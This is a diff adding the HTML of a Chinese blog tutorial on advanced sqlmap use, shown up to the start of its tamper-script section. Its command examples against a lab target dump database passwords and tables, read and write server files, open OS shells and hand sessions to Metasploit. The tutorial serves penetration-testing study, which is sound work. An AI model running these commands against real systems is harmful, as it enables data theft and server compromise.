@@ -1,0 +1,581 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="一、前言Sqlmap 这么优秀的自动化测试工具就不必过多介绍了，也是日常工作中使用频率比较高的一款工具，文章主要考究其基本用法及部分进阶使用手段。 二、sqlmap常用参数12345678910111213141516171819202122232425262728293031323334353637383940414243444546| 命令参数                        |">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Sqlmap 进阶使用考究">
+<meta property="og:url" content="http://example.com/2022/10/30/Sqlmap%E8%BF%9B%E9%98%B6%E4%BD%BF%E7%94%A8%E8%80%83%E7%A9%B6/index.html">
+<meta property="og:site_name" content="世间闲客·此闲行">
+<meta property="og:description" content="一、前言Sqlmap 这么优秀的自动化测试工具就不必过多介绍了，也是日常工作中使用频率比较高的一款工具，文章主要考究其基本用法及部分进阶使用手段。 二、sqlmap常用参数12345678910111213141516171819202122232425262728293031323334353637383940414243444546| 命令参数                        |">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/images/sqlmap/image-20221029161848191.png">
+<meta property="og:image" content="http://example.com/images/sqlmap/image-20221029161942962.png">
+<meta property="og:image" content="http://example.com/images/sqlmap/image-20221029165027147.png">
+<meta property="og:image" content="http://example.com/images/sqlmap/image-20221029165138414.png">
+<meta property="og:image" content="http://example.com/images/sqlmap/image-20221029165340377.png">
+<meta property="og:image" content="http://example.com/images/sqlmap/image-20221029165559549.png">
+<meta property="og:image" content="http://example.com/images/sqlmap/image-20221029165819852.png">
+<meta property="og:image" content="http://example.com/images/sqlmap/image-20221029170103643.png">
+<meta property="og:image" content="http://example.com/images/sqlmap/image-20221029170237202.png">
+<meta property="og:image" content="http://example.com/images/sqlmap/image-20221029170655721.png">
+<meta property="og:image" content="http://example.com/images/sqlmap/image-20221029170833247.png">
+<meta property="og:image" content="http://example.com/images/sqlmap/image-20221029170933044.png">
+<meta property="og:image" content="http://example.com/images/sqlmap/image-20221029172347308.png">
+<meta property="og:image" content="http://example.com/images/sqlmap/image-20221029190033776.png">
+<meta property="og:image" content="http://example.com/images/sqlmap/image-20221029190102891.png">
+<meta property="og:image" content="http://example.com/images/sqlmap/image-20221029190835758.png">
+<meta property="og:image" content="http://example.com/images/sqlmap/image-20221029191222590.png">
+<meta property="og:image" content="http://example.com/images/sqlmap/image-20221029191710336.png">
+<meta property="og:image" content="http://example.com/images/sqlmap/image-20221029192006003.png">
+<meta property="og:image" content="http://example.com/images/sqlmap/image-20221029192030597.png">
+<meta property="og:image" content="http://example.com/images/sqlmap/image-20221029192650298.png">
+<meta property="og:image" content="http://example.com/images/sqlmap/image-20221029193805046.png">
+<meta property="og:image" content="http://example.com/images/sqlmap/image-20221029193839251.png">
+<meta property="og:image" content="http://example.com/images/sqlmap/image-20221029194114549.png">
+<meta property="og:image" content="http://example.com/images/sqlmap/image-20221029194152525.png">
+<meta property="og:image" content="http://example.com/images/sqlmap/image-20221029174714532.png">
+<meta property="og:image" content="http://example.com/images/sqlmap/image-20221029174855562.png">
+<meta property="og:image" content="http://example.com/images/sqlmap/image-20221029180221656.png">
+<meta property="og:image" content="http://example.com/images/sqlmap/image-20221029180535990.png">
+<meta property="og:image" content="http://example.com/images/sqlmap/image-20221029184518955.png">
+<meta property="og:image" content="http://example.com/images/sqlmap/image-20221029184439988.png">
+<meta property="og:image" content="http://example.com/images/sqlmap/image-20221029185203640.png">
+<meta property="og:image" content="http://example.com/images/sqlmap/image-20221029213150700.png">
+<meta property="og:image" content="http://example.com/images/sqlmap/image-20221029184722537.png">
+<meta property="og:image" content="http://example.com/images/sqlmap/image-20221029185105234.png">
+<meta property="og:image" content="http://example.com/images/sqlmap/image-20221029185419868.png">
+<meta property="og:image" content="http://example.com/images/sqlmap/image-20221029185554953.png">
+<meta property="og:image" content="http://example.com/images/sqlmap/image-20221029185835833.png">
+<meta property="og:image" content="http://example.com/images/sqlmap/image-20221029223918619.png">
+<meta property="og:image" content="http://example.com/images/sqlmap/image-20221029224405312.png">
+<meta property="og:image" content="http://example.com/images/sqlmap/image-20221029224443986.png">
+<meta property="og:image" content="http://example.com/images/sqlmap/image-20221029232542537.png">
+<meta property="og:image" content="http://example.com/images/sqlmap/image-20221029232506161.png">
+<meta property="og:image" content="http://example.com/images/sqlmap/image-20221029232153105.png">
+<meta property="og:image" content="http://example.com/images/sqlmap/image-20221029232659447.png">
+<meta property="og:image" content="http://example.com/images/sqlmap/image-20221029232331747.png">
+<meta property="og:image" content="http://example.com/images/sqlmap/image-20221029221914451.png">
+<meta property="og:image" content="http://example.com/images/sqlmap/image-20221029222203157.png">
+<meta property="og:image" content="http://example.com/images/sqlmap/image-20221029222231713.png">
+<meta property="og:image" content="http://example.com/images/sqlmap/image-20221029222252599.png">
+<meta property="og:image" content="http://example.com/images/sqlmap/image-20221029223129493.png">
+<meta property="article:published_time" content="2022-10-30T05:31:37.000Z">
+<meta property="article:modified_time" content="2022-10-30T09:02:04.000Z">
+<meta property="article:author" content="Funsiooo">
+<meta property="article:tag" content="sqlmap">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/images/sqlmap/image-20221029161848191.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/logo-1.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/logo-1.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/logo-1.png">
+        
+      
+    
+    <!-- title -->
+    <title>Sqlmap 进阶使用考究</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+		<script type="text/x-mathjax-config">
+		  MathJax.Hub.Config({
+			tex2jax: {
+			  skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
+			  inlineMath: [['$','$']]
+			}
+		  });
+		</script>
+		<script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/latest.js?config=TeX-MML-AM_CHTML' async></script>
+	
+
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@4.0/dist/fancybox.css" />
+
+<meta name="generator" content="Hexo 5.4.2"><link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css">
+<link rel="stylesheet" href="/css/prism-line-numbers.css" type="text/css"></head>
+
+<body class="max-width mx-auto px3 ">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="目录"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="目录"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="顶部" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/archives/">归档</a></li><!--
+     --><!--
+       --><li><a href="/search/">搜索</a></li><!--
+     --><!--
+       --><li><a href="/tags/">标签</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="上一篇" href="/2022/11/01/WEB%E6%BC%8F%E6%B4%9E%E7%B3%BB%E5%88%97-XXE/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="下一篇" href="/2022/10/26/%E7%95%85%E6%8D%B7%E9%80%9A%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90%E8%BF%87%E7%A8%8B-CNVD-2022-60632/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="分享文章" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2022/10/30/Sqlmap%E8%BF%9B%E9%98%B6%E4%BD%BF%E7%94%A8%E8%80%83%E7%A9%B6/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2022/10/30/Sqlmap%E8%BF%9B%E9%98%B6%E4%BD%BF%E7%94%A8%E8%80%83%E7%A9%B6/&text=Sqlmap 进阶使用考究"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2022/10/30/Sqlmap%E8%BF%9B%E9%98%B6%E4%BD%BF%E7%94%A8%E8%80%83%E7%A9%B6/&title=Sqlmap 进阶使用考究"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2022/10/30/Sqlmap%E8%BF%9B%E9%98%B6%E4%BD%BF%E7%94%A8%E8%80%83%E7%A9%B6/&is_video=false&description=Sqlmap 进阶使用考究"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Sqlmap 进阶使用考究&body=Check out this article: http://example.com/2022/10/30/Sqlmap%E8%BF%9B%E9%98%B6%E4%BD%BF%E7%94%A8%E8%80%83%E7%A9%B6/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2022/10/30/Sqlmap%E8%BF%9B%E9%98%B6%E4%BD%BF%E7%94%A8%E8%80%83%E7%A9%B6/&title=Sqlmap 进阶使用考究"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2022/10/30/Sqlmap%E8%BF%9B%E9%98%B6%E4%BD%BF%E7%94%A8%E8%80%83%E7%A9%B6/&title=Sqlmap 进阶使用考究"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2022/10/30/Sqlmap%E8%BF%9B%E9%98%B6%E4%BD%BF%E7%94%A8%E8%80%83%E7%A9%B6/&title=Sqlmap 进阶使用考究"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2022/10/30/Sqlmap%E8%BF%9B%E9%98%B6%E4%BD%BF%E7%94%A8%E8%80%83%E7%A9%B6/&title=Sqlmap 进阶使用考究"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2022/10/30/Sqlmap%E8%BF%9B%E9%98%B6%E4%BD%BF%E7%94%A8%E8%80%83%E7%A9%B6/&name=Sqlmap 进阶使用考究&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2022/10/30/Sqlmap%E8%BF%9B%E9%98%B6%E4%BD%BF%E7%94%A8%E8%80%83%E7%A9%B6/&t=Sqlmap 进阶使用考究"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">一、前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E3%80%81sqlmap%E5%B8%B8%E7%94%A8%E5%8F%82%E6%95%B0"><span class="toc-number">2.</span> <span class="toc-text">二、sqlmap常用参数</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%89%E3%80%81%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8"><span class="toc-number">3.</span> <span class="toc-text">三、基本使用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9B%9B%E3%80%81Temper%E8%84%9A%E6%9C%AC"><span class="toc-number">4.</span> <span class="toc-text">四、Temper脚本</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#sqlmap%E8%87%AA%E5%B8%A6%E8%84%9A%E6%9C%AC"><span class="toc-number">4.1.</span> <span class="toc-text">sqlmap自带脚本</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Temper%E8%87%AA%E7%BC%96%E5%86%99"><span class="toc-number">4.2.</span> <span class="toc-text">Temper自编写</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%94%E3%80%81%E5%85%B7%E4%BD%93%E5%88%A9%E7%94%A8"><span class="toc-number">5.</span> <span class="toc-text">五、具体利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8"><span class="toc-number">5.1.</span> <span class="toc-text">基础使用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%9B%E9%98%B6%E4%BD%BF%E7%94%A8"><span class="toc-number">5.2.</span> <span class="toc-text">进阶使用</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#os-shell"><span class="toc-number">5.2.1.</span> <span class="toc-text">os-shell</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#sql-shell"><span class="toc-number">5.2.2.</span> <span class="toc-text">sql-shell</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#file-read"><span class="toc-number">5.2.3.</span> <span class="toc-text">file-read</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#file-write%E3%80%81file-dest"><span class="toc-number">5.2.4.</span> <span class="toc-text">file-write、file-dest</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9A%E5%88%B6%E5%8C%96%E5%8F%82%E6%95%B0"><span class="toc-number">5.3.</span> <span class="toc-text">定制化参数</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%AD%E3%80%81%E6%80%BB%E7%BB%93"><span class="toc-number">6.</span> <span class="toc-text">六、总结</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%83%E3%80%81%E5%8F%82%E8%80%83"><span class="toc-number">7.</span> <span class="toc-text">七、参考</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        Sqlmap 进阶使用考究
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">Funsiooo</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2022-10-30T05:31:37.000Z" itemprop="datePublished">2022-10-30</time>
+        
+        (Updated: <time datetime="2022-10-30T09:02:04.000Z" itemprop="dateModified">2022-10-30</time>)
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/">工具使用</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/sqlmap/" rel="tag">sqlmap</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h2 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h2><p>Sqlmap 这么优秀的自动化测试工具就不必过多介绍了，也是日常工作中使用频率比较高的一款工具，文章主要考究其基本用法及部分进阶使用手段。</p>
+<h2 id="二、sqlmap常用参数"><a href="#二、sqlmap常用参数" class="headerlink" title="二、sqlmap常用参数"></a>二、sqlmap常用参数</h2><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">| 命令参数                        | 参数作用                                                     |</span><br><span class="line">| ------------------------------ | ------------------------------------------------------------ |</span><br><span class="line">| -u                             | 指定目标url                                                  |</span><br><span class="line">| -r                             | 从文件中加载HTTP请求（数据包）                               |</span><br><span class="line">| *                              | json格式指定参数，如指定参数orderNo：&#123;&quot;phoneNo&quot;:&quot;15123456789&quot;,&quot;platNum&quot;:&quot;844519422627945&quot;,&quot;orderNo&quot;:&quot;1*&quot;&#125; |</span><br><span class="line">| -m                             | 从文本中获取多个目标扫描                                     |</span><br><span class="line">| --data                         | 以POST方式提交数据                                           |</span><br><span class="line">| -random-agent                  | 随机User-Agent                                               |</span><br><span class="line">| --user-agent                   | 指定User-Agent                                               |</span><br><span class="line">| --delay                        | 设置请求间的延迟                                             |</span><br><span class="line">| --timeout                      | 指定超时时间                                                 |</span><br><span class="line">| --dbms                         | 指定db，sqlmap支持的db有MySQL、Oracle、PostgreSQL、Microsoft SQL Server、Microsoft Access、SQLite等 |</span><br><span class="line">| --os                           | 指定数据库服务器操作系统                                     |</span><br><span class="line">| --tamper                       | 指定脚本tamper                                               |</span><br><span class="line">| --level                        | 指定探测等级                                                 |</span><br><span class="line">| --risk                         | 指定风险等级                                                 |</span><br><span class="line">| --technique                    | B: Boolean-based blind SQL injection&lt;br/&gt;E: Error-based SQL injection&lt;br/&gt;U: UNION query SQL injection&lt;br/&gt;S: Stacked queries SQL injection&lt;br/&gt;T: Time-based blind SQL injection |</span><br><span class="line">| -p                             | 指定需要测试的参数                                           |</span><br><span class="line">| –batch                         | 自动选择Y/N                                                  |</span><br><span class="line">| –dbs                           | 枚举数据库                                                   |</span><br><span class="line">| -D                             | DATABASE：指定数据库                                         |</span><br><span class="line">| –tables                        | 枚举表名                                                     |</span><br><span class="line">| -T                             | 指定表名                                                     |</span><br><span class="line">| –columns                       | 枚举列名                                                     |</span><br><span class="line">| -D                             | COLUMN：指定字段                                             |</span><br><span class="line">| –dump                          | 脱取指定字段                                                 |</span><br><span class="line">| –dump-all                      | 脱取数据库全部字段                                           |</span><br><span class="line">| -a/–all                        | 获取所有信息                                                 |</span><br><span class="line">| -b/–banner                     | 获取banner信息                                               |</span><br><span class="line">| –current-user                  | 获取当前数据库用户                                           |</span><br><span class="line">| –is-dba                        | 判断当前用户是否为DBA权限                                    |</span><br><span class="line">| –users                         | 枚举用户列表                                                 |</span><br><span class="line">| –sql-shell                     | 返回交互式数据库的shell                                      |</span><br><span class="line">| –os-shell                      | 返回交互式的操作系统shell                                    |</span><br><span class="line">| –os-cmd                        | 执行OS命令CMD                                                |</span><br><span class="line">| –cookie=COOKIE                 | 伪造cookie                                                   |</span><br><span class="line">| --proxy=PROXY                  | 使用代理连接目标 URL                                         |</span><br><span class="line">| --mobile                       | 使用 HTTP User-Agent 模仿智能手机                            |</span><br><span class="line">| -H HEADER                      | 设置额外的 HTTP 头参数（例如：&quot;X-Forwarded-For: 127.0.0.1&quot;） |</span><br><span class="line">| --ignore-proxy                 | 忽略系统默认代理设置                                         |</span><br><span class="line">| *                              | 在                                                           |</span><br><span class="line">| --keep-alive                   | 保持连接，出现[CRITICAL] connection......报错的时候，使用这个参数 |</span><br><span class="line">| --referer http://www.baidu.com | #伪造referer字段                                             |</span><br><span class="line">| -v 3                           | 输出详细度,最大值5,会显示请求包和回复包                      |</span><br><span class="line">| --roles                        | 列出数据库所有管理员角色，仅适用于oracle数据库的时候         |</span><br><span class="line">| --identify-waf                 | 检测是否有WAF                                                |</span><br></pre></td></tr></table></figure></div>
+
+
+<h2 id="三、基本使用"><a href="#三、基本使用" class="headerlink" title="三、基本使用"></a>三、基本使用</h2><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"># 基本语法</span><br><span class="line">sqlmap -r sql.txt  # sql.txt是我们抓取的 http 请求包</span><br><span class="line">sqlmap -r sql.txt -p username  # 指定参数，请求包中存在多个参数，根据前期探测已知注入点为 username，所以可利用 -p 指定参数，减少不必要的探测</span><br><span class="line">sqlmap -u &quot;http://www.xxx.com/username/admin*&quot;         # 已知注入参数，可以在其后面加个*来让sqlmap对其注入，post包中json数据也可使用该*号</span><br><span class="line">sqlmap -u &quot;http://192.168.114.144/sqli/Less-1/?id=1&quot;   # 探测该url是否存在漏洞，实际探测 id 参数是否存在注入</span><br><span class="line">sqlmap -u &quot;http://192.168.114.144/sqli/Less-1/?id=1&quot; --cookie=&quot;登录抓取的cookie&quot;   # 当该网站需要登录时，探测该url是否存在漏洞</span><br><span class="line">sqlmap -u &quot;http://192.168.114.144/sqli/Less-1/?id=1&quot; --data=&quot;uname=admin&amp;passwd=admin&amp;submit=Submit&quot;  # 抓取其post提交的数据填入进行探测</span><br><span class="line">sqlmap -u &quot;http://192.168.114.144/sqli/Less-1/?id=1&quot; --users      # 查看数据库的所有用户</span><br><span class="line">sqlmap -u &quot;http://192.168.114.144/sqli/Less-1/?id=1&quot; --passwords  # 查看数据库用户名的密码</span><br><span class="line">sqlmap -u &quot;http://192.168.114.144/sqli/Less-1/?id=1&quot;  --dbs       # 查看所有数据库</span><br><span class="line">sqlmap -u &quot;http://192.168.114.144/sqli/Less-1/?id=1&quot;  --tables    # 查看所有数据表</span><br><span class="line">sqlmap -u &quot;http://192.168.114.144/sqli/Less-1/?id=1&quot;  --columns   # 查看数据库中所有列</span><br><span class="line">sqlmap -u &quot;http://192.168.114.144/sqli/Less-1/?id=1&quot;  --current-db         # 查看当前数据库</span><br><span class="line">sqlmap -u &quot;http://192.168.114.144/sqli/Less-1/?id=1&quot; -D 数据库名 --tables       # 查看指定数据库中的所有表</span><br><span class="line">sqlmap -u &quot;http://192.168.114.144/sqli/Less-1/?id=1&quot; -D 数据库名 -T 数据表名 --columns # 查看指定数据库中指定表中的所有列</span><br><span class="line">sqlmap -u &quot;http://192.168.114.144/sqli/Less-1/?id=1&quot; -D 数据库名 -T 数据表名 -C 数据列 --dump  # 查看指定数据库中的指定表中指定列的所有数据</span><br><span class="line">sqlmap -u &quot;http://192.168.114.144/sqli/Less-1/?id=1&quot; -D 数据库名 -T 数据表名 -C 数据列 --dump --start 1 --stop 10  # 查看指定数据库中的指定表中指定列的前10条数据</span><br><span class="line">sqlmap -u &quot;http://192.168.114.144/sqli/Less-1/?id=1&quot; -D security -T users --dump-all # 查看数据库security中的users表中的所有数据</span><br><span class="line">sqlmap -u &quot;http://192.168.114.144/sqli/Less-1/?id=1&quot; -D security --dump-all   # 查看数据库security中的所有数据</span><br><span class="line">sqlmap -u &quot;http://192.168.114.144/sqli/Less-1/?id=1&quot; --dump-all  # 查看该数据库中的所有数据</span><br><span class="line">sqlmap -u &quot;http://192.168.114.144/sqli/Less-1/?id=1&quot; --tamper=space2comment.py  # 指定脚本进行过滤，用/**/代替空格</span><br><span class="line">sqlmap -u &quot;http://192.168.114.144/sqli/Less-5/?id=1&quot; --level=5 --risk=3 # 探测等级5，平台危险等级3，都是最高级别。当level=2时，会测试cookie注入。当level=3时，会测试user-agent/referer注入</span><br><span class="line">sqlmap -u &quot;http://192.168.114.144/sqli/Less-5/?id=1&quot; --dbms=&quot;MySQL&quot;     # 指定其数据库为mysql</span><br><span class="line">sqlmap -u &quot;http://192.168.114.144/sqli/Less-5/?id=1&quot; --proxy=&quot;http://192.168.114.144:8080&quot;    #指定代理</span><br><span class="line">当爆破HTTPS网站会出现超时的话，可以使用参数 --delay=3 --force-ssl</span><br><span class="line">sqlmap -u &quot;http://192.168.114.144/sqli/Less-5/?id=1&quot; --technique T    # 指定时间延迟注入，这个参数可以指定sqlmap使用的探测技术，默认情况下会测试所有的方式，当然，也可以直接手工指定，-t效果一样。</span><br><span class="line"></span><br><span class="line"># 命令执行</span><br><span class="line">sqlmap -u &quot;http://192.168.114.144/sqli/Less-1/?id=1&quot; --sql-shell  # 执行指定的sql语句</span><br><span class="line">sqlmap -u &quot;http://192.168.114.144/sqli/Less-5/?id=1&quot; --os-shell/--os-cmd   # 执行--os-shell命令，获取目标服务器权限</span><br><span class="line">sqlmap -u &quot;http://192.168.114.144/sqli/Less-5/?id=1&quot; --os-pwn   # 执行--os-pwn命令，将目标权限弹到MSF上</span><br><span class="line">sqlmap -u &quot;http://192.168.114.144/sqli/Less-5/?id=1&quot; --file-read &quot;c:/test.txt&quot; # 读取目标服务器C盘下的test.txt文件</span><br><span class="line">sqlmap -u &quot;http://192.168.114.144/sqli/Less-5/?id=1&quot; --file-write  test.txt  --file-dest &quot;e:/hack.txt&quot;  # 将本地的test.txt文件上传到目标服务器的E盘下，并且名字为hack.txt</span><br><span class="line">sqlmap -d &quot;mysql://root:root@192.168.114.14430:3306/mysql&quot; --os-shell   # 知道网站的账号密码直接连接</span><br></pre></td></tr></table></figure></div>
+
+
+
+<h2 id="四、Temper脚本"><a href="#四、Temper脚本" class="headerlink" title="四、Temper脚本"></a>四、Temper脚本</h2><h3 id="sqlmap自带脚本"><a href="#sqlmap自带脚本" class="headerlink" title="sqlmap自带脚本"></a>sqlmap自带脚本</h3><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">| temper                       | function                                                     |</span><br><span class="line">| ---------------------------- | :----------------------------------------------------------- |</span><br><span class="line">| apostrophemask.py            | 